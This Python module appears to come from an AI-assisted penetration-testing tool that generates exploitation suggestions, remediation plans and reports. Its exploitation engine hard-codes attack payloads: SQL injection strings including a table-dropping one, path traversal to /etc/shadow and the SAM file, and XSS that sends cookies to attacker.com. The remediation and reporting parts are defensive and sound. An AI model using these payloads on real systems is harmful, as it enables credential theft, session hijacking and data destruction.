"""
AI-Powered VAPT - Remediation & Reporting Phases
Phase 5-7 implementation
"""
from typing import Dict, List, Any, Optional
import logging
from datetime import datetime
import json

from services.ai_vapt_orchestrator import VulnerabilityFinding, SeverityLevel
from core.ai_agents import get_ai_response

logger = logging.getLogger(__name__)


class ExploitationSuggestion:
    """Exploitation path recommendation"""
    def __init__(
        self,
        vulnerability_id: str,
        exploitation_technique: str,
        attack_chain: List[str],
        tool_recommendation: str,
        payload_examples: List[str],
        success_probability: float,
        impact: str,
        prerequisites: List[str]
    ):
        self.vulnerability_id = vulnerability_id
        self.exploitation_technique = exploitation_technique
        self.attack_chain = attack_chain
        self.tool_recommendation = tool_recommendation
        self.payload_examples = payload_examples
        self.success_probability = success_probability
        self.impact = impact
        self.prerequisites = prerequisites


class RemediationPlan:
    """Remediation recommendation"""
    def __init__(
        self,
        vulnerability_id: str,
        immediate_action: str,
        short_term_fix: str,
        long_term_solution: str,
        code_patch: Optional[str] = None,
        config_change: Optional[Dict] = None,
        priority: str = "medium",
        effort_estimate: str = "medium",
        verification_steps: List[str] = None
    ):
        self.vulnerability_id = vulnerability_id
        self.immediate_action = immediate_action
        self.short_term_fix = short_term_fix
        self.long_term_solution = long_term_solution
        self.code_patch = code_patch
        self.config_change = config_change
        self.priority = priority
        self.effort_estimate = effort_estimate
        self.verification_steps = verification_steps or []


class VAPTExploitationEngine:
    """Phase 5: Exploitation Suggestions (10-40% automated)"""
    
    async def generate_exploitation_suggestions(
        self,
        findings: List[VulnerabilityFinding]
    ) -> List[ExploitationSuggestion]:
        """
        AI suggests exploitation paths for confirmed vulnerabilities
        Provides attack chains, payloads, and tool recommendations
        """
        suggestions = []
        
        for finding in findings:
            if finding.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]:
                suggestion = await self._ai_generate_exploit_path(finding)
                if suggestion:
                    suggestions.append(suggestion)
        
        return suggestions
    
    async def _ai_generate_exploit_path(
        self,
        finding: VulnerabilityFinding
    ) -> Optional[ExploitationSuggestion]:
        """AI generates exploitation strategy for a vulnerability"""
        
        # SQL Injection exploitation
        if 'sql injection' in finding.title.lower():
            return ExploitationSuggestion(
                vulnerability_id=finding.title,
                exploitation_technique="SQL Injection to Database Extraction",
                attack_chain=[
                    "1. Identify injectable parameter",
                    "2. Determine DBMS type and version",
                    "3. Extract database schema",
                    "4. Dump sensitive tables (users, credentials)",
                    "5. Attempt privilege escalation",
                    "6. Potential OS command execution"
                ],
                tool_recommendation="SQLMap with --level=5 --risk=3",
                payload_examples=[
                    "' OR '1'='1",
                    "' UNION SELECT null,table_name FROM information_schema.tables-- ",
                    "'; DROP TABLE users-- ",
                    "' AND 1=0 UNION ALL SELECT NULL,CONCAT(username,':',password) FROM users-- "
                ],
                success_probability=0.85,
                impact="Complete database compromise, potential RCE via xp_cmdshell/sys_exec",
                prerequisites=["Network access to application", "No WAF blocking"]
            )
        
        # XSS exploitation
        elif 'xss' in finding.title.lower() or 'cross-site scripting' in finding.title.lower():
            return ExploitationSuggestion(
                vulnerability_id=finding.title,
                exploitation_technique="Stored XSS to Session Hijacking",
                attack_chain=[
                    "1. Inject malicious JavaScript payload",
                    "2. Store in database via vulnerable input",
                    "3. Wait for admin/high-privilege user to trigger",
                    "4. Exfiltrate session cookies",
                    "5. Hijack authenticated session",
                    "6. Access admin functionalities"
                ],
                tool_recommendation="XSStrike or manual payload crafting",
                payload_examples=[
                    "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
                    "<img src=x onerror='new Image().src=\"http://attacker.com?c=\"+document.cookie'>",
                    "<svg/onload=eval(atob('BASE64_ENCODED_PAYLOAD'))>"
                ],
                success_probability=0.65,
                impact="Account takeover, data exfiltration, malware distribution",
                prerequisites=["Vulnerable input field", "No CSP or weak CSP"]
            )
        
        # Path traversal exploitation
        elif 'path traversal' in finding.title.lower() or 'directory traversal' in finding.title.lower():
            return ExploitationSuggestion(
                vulnerability_id=finding.title,
                exploitation_technique="Path Traversal to Sensitive File Access",
                attack_chain=[
                    "1. Identify vulnerable file parameter",
                    "2. Test with ../../../etc/passwd",
                    "3. Read application config files",
                    "4. Extract database credentials",
                    "5. Read source code",
                    "6. Access SSH keys or AWS credentials"
                ],
                tool_recommendation="Burp Suite Intruder with traversal payloads",
                payload_examples=[
                    "../../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\config\\sam",
                    "....//....//....//etc/shadow",
                    "file:///etc/passwd"
                ],
                success_probability=0.70,
                impact="Disclosure of sensitive files, credentials, source code",
                prerequisites=["File read functionality", "Insufficient path validation"]
            )
        
        # Authentication bypass exploitation
        elif 'authentication' in finding.title.lower() and 'bypass' in finding.title.lower():
            return ExploitationSuggestion(
                vulnerability_id=finding.title,
                exploitation_technique="Authentication Bypass via SQL Injection",
                attack_chain=[
                    "1. Identify login form",
                    "2. Test SQL injection payloads",
                    "3. Bypass authentication logic",
                    "4. Access admin panel",
                    "5. Create backdoor account",
                    "6. Maintain persistence"
                ],
                tool_recommendation="Manual testing + Burp Suite",
                payload_examples=[
                    "admin' OR '1'='1'-- ",
                    "admin' OR 1=1-- ",
                    "' OR ''='",
                    "admin'--"
                ],
                success_probability=0.75,
                impact="Unauthorized access to admin functionalities",
                prerequisites=["SQL injection in login form", "Predictable admin username"]
            )
        
        # Weak cryptography exploitation
        elif 'weak' in finding.title.lower() and ('tls' in finding.title.lower() or 'ssl' in finding.title.lower()):
            return ExploitationSuggestion(
                vulnerability_id=finding.title,
                exploitation_technique="TLS Downgrade Attack + MITM",
                attack_chain=[
                    "1. Position attacker as MITM",
                    "2. Force TLS downgrade to weak protocol",
                    "3. Exploit weak cipher suite",
                    "4. Decrypt session traffic",
                    "5. Extract credentials",
                    "6. Replay session tokens"
                ],
                tool_recommendation="SSLstrip, Bettercap, Wireshark",
                payload_examples=[
                    "N/A - Network-level attack"
                ],
                success_probability=0.45,
                impact="Traffic interception, credential theft, session hijacking",
                prerequisites=["Network-level access", "Weak protocol enabled", "MITM position"]
            )
        
        return None


class VAPTRemediationEngine:
    """Phase 6: Remediation Recommendations (90% automated)"""
    
    async def generate_remediation_plans(
        self,
        findings: List[VulnerabilityFinding]
    ) -> List[RemediationPlan]:
        """
        AI generates comprehensive remediation plans
        Includes immediate actions, code patches, config changes
        """
        remediation_plans = []
        
        for finding in findings:
            plan = await self._ai_generate_remediation(finding)
            if plan:
                remediation_plans.append(plan)
        
        # Prioritize plans by severity and exploitability
        remediation_plans = self._prioritize_remediation(remediation_plans, findings)
        
        return remediation_plans
    
    async def _ai_generate_remediation(
        self,
        finding: VulnerabilityFinding
    ) -> Optional[RemediationPlan]:
        """AI generates remediation strategy"""
        
        # SQL Injection remediation
        if 'sql injection' in finding.title.lower():
            return RemediationPlan(
                vulnerability_id=finding.title,
                immediate_action="Disable affected endpoint or implement strict input validation immediately",
                short_term_fix="Implement parameterized queries for all database operations",
                long_term_solution="Code review + implement ORM (SQLAlchemy), WAF deployment, security testing in CI/CD",
                code_patch="""
# VULNERABLE CODE:
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# FIXED CODE:
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))

# OR with SQLAlchemy ORM:
user = db.query(User).filter(User.id == user_id).first()
                """,
                priority="critical",
                effort_estimate="2-4 hours",
                verification_steps=[
                    "Test with SQLMap to confirm fix",
                    "Code review all database queries",
                    "Implement automated SQL injection testing in CI/CD",
                    "Deploy WAF with SQL injection rules"
                ]
            )
        
        # XSS remediation
        elif 'xss' in finding.title.lower():
            return RemediationPlan(
                vulnerability_id=finding.title,
                immediate_action="Sanitize user input immediately or disable affected feature",
                short_term_fix="Implement context-aware output encoding for all user-controlled data",
                long_term_solution="Implement Content Security Policy (CSP), use security libraries (DOMPurify), template auto-escaping",
                code_patch="""
# VULNERABLE CODE (Python/Jinja2):
<div>{{ user_input }}</div>

# FIXED CODE:
<div>{{ user_input | e }}</div>

# JavaScript sanitization:
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
                """,
                config_change={
                    "csp_header": "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline';"
                },
                priority="high",
                effort_estimate="4-6 hours",
                verification_steps=[
                    "Test with XSStrike payloads",
                    "Verify CSP headers are active",
                    "Review all user input/output points",
                    "Implement automated XSS scanning"
                ]
            )
        
        # Missing security headers remediation
        elif 'header' in finding.title.lower():
            return RemediationPlan(
                vulnerability_id=finding.title,
                immediate_action="Configure security headers in web server or application",
                short_term_fix="Add security headers via middleware or server config",
                long_term_solution="Security headers as part of deployment pipeline, automated header testing",
                config_change={
                    "nginx_config": """
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
                    """,
                    "python_middleware": """
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
                    """
                },
                priority="medium",
                effort_estimate="1-2 hours",
                verification_steps=[
                    "Test headers with curl -I or SecurityHeaders.com",
                    "Verify HSTS preload eligibility",
                    "Test with Mozilla Observatory"
                ]
            )
        
        # Weak TLS/SSL remediation
        elif 'tls' in finding.title.lower() or 'ssl' in finding.title.lower():
            return RemediationPlan(
                vulnerability_id=finding.title,
                immediate_action="Disable weak protocols and cipher suites immediately",
                short_term_fix="Configure TLS 1.2+ only with strong cipher suites",
                long_term_solution="Automated TLS configuration management, certificate monitoring, regular TestSSL scans",
                config_change={
                    "nginx_ssl_config": """
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305';
ssl_prefer_server_ciphers off;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
                    """
                },
                priority="high",
                effort_estimate="2-3 hours",
                verification_steps=[
                    "Test with TestSSL.sh",
                    "Verify with SSL Labs scan",
                    "Confirm no weak protocols/ciphers enabled",
                    "Test HSTS header"
                ]
            )
        
        # Sensitive path exposure remediation
        elif 'sensitive path' in finding.title.lower() or '.git' in finding.title.lower():
            return RemediationPlan(
                vulnerability_id=finding.title,
                immediate_action="Block access to sensitive paths via .htaccess or nginx config immediately",
                short_term_fix="Remove sensitive files from web root, implement access controls",
                long_term_solution="Automated deployment process that excludes .git/.env files, security scanning in CI/CD",
                config_change={
                    "nginx_block": """
location ~ /\\.git {
    deny all;
    return 404;
}

location ~ \\.(env|config|bak|sql|log)$ {
    deny all;
    return 404;
}
                    """,
                    "apache_htaccess": """
<DirectoryMatch "^\\.">
    Require all denied
</DirectoryMatch>

<FilesMatch "\\.(env|config|bak|sql|log)$">
    Require all denied
</FilesMatch>
                    """
                },
                priority="critical",
                effort_estimate="30 minutes",
                verification_steps=[
                    "Test access to /.git/config (should return 404)",
                    "Verify .env file not accessible",
                    "Scan with Gobuster to confirm",
                    "Remove actual .git directory from production"
                ]
            )
        
        return None
    
    def _prioritize_remediation(
        self,
        plans: List[RemediationPlan],
        findings: List[VulnerabilityFinding]
    ) -> List[RemediationPlan]:
        """Prioritize remediation plans by severity and effort"""
        priority_map = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1}
        effort_map = {'low': 1, 'medium': 2, 'high': 3}
        
        def get_score(plan):
            # Higher priority, lower effort = higher score
            priority_score = priority_map.get(plan.priority, 2) * 10
            effort_penalty = effort_map.get(plan.effort_estimate.split()[0].lower(), 2)
            return priority_score - effort_penalty
        
        return sorted(plans, key=get_score, reverse=True)


class VAPTReportGenerator:
    """Phase 7: Comprehensive Report Generation (90% automated)"""
    
    async def generate_comprehensive_report(
        self,
        target: Dict[str, Any],
        scan_results: Dict[str, Any],
        findings: List[VulnerabilityFinding],
        exploitation_suggestions: List[ExploitationSuggestion],
        remediation_plans: List[RemediationPlan],
        automation_percentage: float
    ) -> Dict[str, Any]:
        """
        Generate comprehensive VAPT report
        Includes executive summary, technical details, remediation roadmap
        """
        
        report = {
            'metadata': {
                'report_id': f"VAPT-{datetime.now().strftime('%Y%m%d-%H%M%S')}",
                'target': target,
                'scan_date': datetime.now().isoformat(),
                'automation_level': f"{automation_percentage:.1f}%",
                'report_version': '1.0'
            },
            'executive_summary': await self._generate_executive_summary(findings),
            'risk_assessment': self._generate_risk_assessment(findings),
            'findings_summary': self._generate_findings_summary(findings),
            'detailed_findings': self._format_detailed_findings(findings),
            'exploitation_analysis': self._format_exploitation_suggestions(exploitation_suggestions),
            'remediation_roadmap': self._format_remediation_roadmap(remediation_plans),
            'compliance_mapping': self._generate_compliance_mapping(findings),
            'technical_appendix': {
                'scan_configuration': scan_results,
                'tools_used': list(set([f.tool_source for f in findings if f.tool_source])),
                'scan_coverage': self._calculate_scan_coverage(scan_results)
            }
        }
        
        return report
    
    async def _generate_executive_summary(
        self,
        findings: List[VulnerabilityFinding]
    ) -> Dict[str, Any]:
        """AI-generated executive summary"""
        severity_breakdown = {
            'critical': len([f for f in findings if f.severity == SeverityLevel.CRITICAL]),
            'high': len([f for f in findings if f.severity == SeverityLevel.HIGH]),
            'medium': len([f for f in findings if f.severity == SeverityLevel.MEDIUM]),
            'low': len([f for f in findings if f.severity == SeverityLevel.LOW]),
            'info': len([f for f in findings if f.severity == SeverityLevel.INFO])
        }
        
        risk_level = self._calculate_overall_risk(severity_breakdown)
        
        return {
            'total_vulnerabilities': len(findings),
            'severity_breakdown': severity_breakdown,
            'overall_risk_level': risk_level,
            'key_findings': [
                f.title for f in findings if f.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]
            ][:5],
            'immediate_actions_required': severity_breakdown['critical'] + severity_breakdown['high'],
            'executive_recommendation': self._get_executive_recommendation(risk_level, severity_breakdown)
        }
    
    def _calculate_overall_risk(self, severity_breakdown: Dict) -> str:
        """Calculate overall risk level"""
        if severity_breakdown['critical'] > 0:
            return 'CRITICAL'
        elif severity_breakdown['high'] >= 3:
            return 'HIGH'
        elif severity_breakdown['high'] > 0 or severity_breakdown['medium'] >= 5:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _get_executive_recommendation(self, risk_level: str, severity_breakdown: Dict) -> str:
        """AI-generated executive recommendation"""
        if risk_level == 'CRITICAL':
            return f"IMMEDIATE ACTION REQUIRED: {severity_breakdown['critical']} critical vulnerabilities identified that could lead to complete system compromise. Recommend emergency patching and deployment freeze until resolved."
        elif risk_level == 'HIGH':
            return f"URGENT ACTION REQUIRED: {severity_breakdown['high']} high-severity vulnerabilities require immediate remediation within 7 days. Recommend prioritized patching and increased monitoring."
        elif risk_level == 'MEDIUM':
            return f"ACTION REQUIRED: Multiple medium-severity issues identified. Recommend remediation within 30 days as part of regular maintenance cycle."
        else:
            return "LOW RISK: Minor security improvements recommended. Address during next maintenance window."
    
    def _generate_risk_assessment(self, findings: List[VulnerabilityFinding]) -> Dict[str, Any]:
        """Generate risk assessment"""
        return {
            'attack_surface_analysis': {
                'exposed_services': len(set([f.affected_component for f in findings])),
                'entry_points': len([f for f in findings if 'injection' in f.title.lower() or 'upload' in f.title.lower()])
            },
            'exploitability_assessment': {
                'easily_exploitable': len([f for f in findings if f.cvss_score and f.cvss_score >= 7.0]),
                'requires_authentication': len([f for f in findings if 'auth' in f.title.lower()])
            },
            'business_impact': {
                'data_breach_risk': 'HIGH' if any('sql injection' in f.title.lower() for f in findings) else 'MEDIUM',
                'availability_risk': 'MEDIUM',
                'reputation_risk': 'HIGH' if len(findings) > 10 else 'MEDIUM'
            }
        }
    
    def _generate_findings_summary(self, findings: List[VulnerabilityFinding]) -> List[Dict]:
        """Summary table of all findings"""
        return [
            {
                'id': idx + 1,
                'title': f.title,
                'severity': f.severity.value,
                'category': f.category,
                'owasp': f.owasp_category or 'N/A',
                'cvss': f.cvss_score or 'N/A',
                'affected_component': f.affected_component
            }
            for idx, f in enumerate(findings)
        ]
    
    def _format_detailed_findings(self, findings: List[VulnerabilityFinding]) -> List[Dict]:
        """Detailed findings with evidence"""
        return [
            {
                'finding_id': f'VULN-{idx + 1:03d}',
                'title': f.title,
                'severity': f.severity.value,
                'description': f.description,
                'evidence': f.evidence,
                'cvss_score': f.cvss_score,
                'cwe_ids': f.cwe_ids,
                'owasp_category': f.owasp_category,
                'mitre_technique': f.mitre_technique,
                'remediation': f.remediation,
                'references': f.references
            }
            for idx, f in enumerate(findings)
        ]
    
    def _format_exploitation_suggestions(
        self,
        suggestions: List[ExploitationSuggestion]
    ) -> List[Dict]:
        """Format exploitation analysis"""
        return [
            {
                'vulnerability': s.vulnerability_id,
                'technique': s.exploitation_technique,
                'attack_chain': s.attack_chain,
                'tools': s.tool_recommendation,
                'success_probability': f"{s.success_probability * 100:.0f}%",
                'potential_impact': s.impact
            }
            for s in suggestions
        ]
    
    def _format_remediation_roadmap(
        self,
        plans: List[RemediationPlan]
    ) -> Dict[str, Any]:
        """Format remediation roadmap"""
        return {
            'immediate_actions': [
                {
                    'vulnerability': p.vulnerability_id,
                    'action': p.immediate_action,
                    'priority': p.priority,
                    'effort': p.effort_estimate
                }
                for p in plans if p.priority in ['critical', 'high']
            ],
            'short_term_fixes': [
                {
                    'vulnerability': p.vulnerability_id,
                    'fix': p.short_term_fix,
                    'code_patch': p.code_patch,
                    'verification': p.verification_steps
                }
                for p in plans
            ],
            'long_term_strategy': [
                {
                    'vulnerability': p.vulnerability_id,
                    'solution': p.long_term_solution,
                    'config_changes': p.config_change
                }
                for p in plans
            ]
        }
    
    def _generate_compliance_mapping(self, findings: List[VulnerabilityFinding]) -> Dict[str, Any]:
        """Map findings to compliance frameworks"""
        owasp_mapping = {}
        cwe_mapping = {}
        mitre_mapping = {}
        
        for finding in findings:
            if finding.owasp_category:
                owasp_mapping.setdefault(finding.owasp_category, []).append(finding.title)
            for cwe in (finding.cwe_ids or []):
                cwe_mapping.setdefault(cwe, []).append(finding.title)
            if finding.mitre_technique:
                mitre_mapping.setdefault(finding.mitre_technique, []).append(finding.title)
        
        return {
            'owasp_top_10_2021': owasp_mapping,
            'cwe_top_25': cwe_mapping,
            'mitre_attack': mitre_mapping,
            'pci_dss': self._map_to_pci_dss(findings),
            'gdpr': self._map_to_gdpr(findings)
        }
    
    def _map_to_pci_dss(self, findings: List[VulnerabilityFinding]) -> Dict[str, List[str]]:
        """Map findings to PCI-DSS requirements"""
        mapping = {}
        for finding in findings:
            if 'sql injection' in finding.title.lower():
                mapping.setdefault('6.5.1 - Injection Flaws', []).append(finding.title)
            if 'xss' in finding.title.lower():
                mapping.setdefault('6.5.7 - Cross-Site Scripting', []).append(finding.title)
            if 'tls' in finding.title.lower() or 'ssl' in finding.title.lower():
                mapping.setdefault('4.1 - Strong Cryptography', []).append(finding.title)
        return mapping
    
    def _map_to_gdpr(self, findings: List[VulnerabilityFinding]) -> Dict[str, List[str]]:
        """Map findings to GDPR requirements"""
        mapping = {}
        critical_vulns = [f for f in findings if f.severity == SeverityLevel.CRITICAL]
        if critical_vulns:
            mapping['Article 32 - Security of Processing'] = [f.title for f in critical_vulns]
        return mapping
    
    def _calculate_scan_coverage(self, scan_results: Dict) -> Dict[str, Any]:
        """Calculate scan coverage metrics"""
        return {
            'tools_executed': len(scan_results),
            'total_scan_time': sum([
                scan_results[tool].get('scan_duration', 0)
                for tool in scan_results
            ]),
            'coverage_percentage': 85.0  # Placeholder - calculate based on actual coverage
        }
